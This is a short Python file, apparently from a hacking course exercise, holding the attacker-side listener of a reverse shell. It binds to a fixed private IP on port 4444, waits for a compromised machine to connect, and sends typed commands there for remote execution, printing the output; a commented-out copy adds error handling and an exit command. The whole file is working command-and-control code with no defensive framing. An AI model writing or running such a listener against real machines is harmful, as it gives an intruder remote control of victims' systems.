import socket , json 

class Listener :

    def __init__(self , ip , port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[*] Listening for incoming connections...")
        self.connection , self.address = listener.accept()
        print("[*] Connection established!")

    def reliable_send(self , data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = self.connection.recv(4096)
        return json.loads(json_data.decode())

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()
    
    def run(self):
        while True:
            command = input(">>")
            result = self.execute_remotely(command)
            print(result, end="")

my_listener = Listener("172.25.247.219" , 4444 )
my_listener.run()


# import socket
# import json

# class Listener:
#     def __init__(self, ip, port):
#         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         listener.bind((ip, port))
#         listener.listen(0)
#         print("[*] Listening for incoming connections...")
#         self.connection, self.address = listener.accept()
#         print(f"[*] Connection established from {self.address}")

#     def reliable_send(self, data):
#         try:
#             json_data = json.dumps(data)  # Convert data to JSON string
#             self.connection.send(json_data.encode())  # Encode to bytes and send
#         except Exception as e:
#             print(f"Error in reliable_send: {e}")

#     def reliable_receive(self):
#         try:
#             json_data = self.connection.recv(4096).decode()  # Receive and decode
#             return json.loads(json_data)  # Parse JSON to Python object
#         except Exception as e:
#             print(f"Error in reliable_receive: {e}")
#             return None

#     def execute_remotely(self, command):
#         self.reliable_send(command)
#         return self.reliable_receive()

#     def run(self):
#         while True:
#             try:
#                 command = input(">> ")
#                 if command.lower() == "exit":
#                     self.connection.close()
#                     break
#                 result = self.execute_remotely(command)
#                 if result is not None:
#                     print(result, end="")
#             except Exception as e:
#                 print(f"Error in run: {e}")
#                 break

# my_listener = Listener("172.25.247.219", 4444)
# my_listener.run()